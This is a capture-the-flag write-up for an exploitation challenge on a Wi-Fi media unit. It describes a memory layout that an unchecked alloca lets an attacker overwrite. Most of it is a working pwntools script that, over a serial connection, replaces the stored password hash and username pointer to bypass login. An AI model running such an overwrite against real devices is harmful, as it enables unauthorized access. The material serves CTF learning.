# Unauthorized, Exp, 100pts

> Let's do something simple. This media unit has a Wifi access point and looks like remote access is possible. But only if you know the right password.


Notes:

> structure at 0x3001
> sha256(password) - 0x20 bytes
> address(username) - 2 bytes
> size(username) + 1 - 2 bytes
> username

> We can overwrite it, because of unchecked `alloca`.

Final code:

```python
#!/usr/bin/python2

from pwn import *


def attack(connection):
    def send(bytes):
        for byte in bytes:
            connection.send(byte)
            connection.recvuntil(byte)

    user = "p4"
    password = "P4 8 11 |~gg~|`jjnb"

    connection.recvuntil("Initialized      \r\n")

    buffer = StringIO()
    buffer.write("{:d}:".format(0x0eac))
    buffer.write("10:")
    buffer.write(hashlib.sha256(password).digest())
    buffer.write(p16(0x3025))
    buffer.write(p16(len(user) + 1))
    buffer.write(user)
    buffer.write("\x00")
    data = buffer.getvalue()
    if "\n" in data:
        raise Exception
    send("{:s}\n".format(data))

    connection.recvuntil("Unknown user!")

    send("{:d}:{:d}:{:s}{:s}\n".format(len(user), len(password), user, password))

    connection.recvuntil("FIXME")


context.log_level = "debug"
with serialtube(port = "/dev/ttyUSB0", baudrate = 115200) as connection:
    attack(connection)
```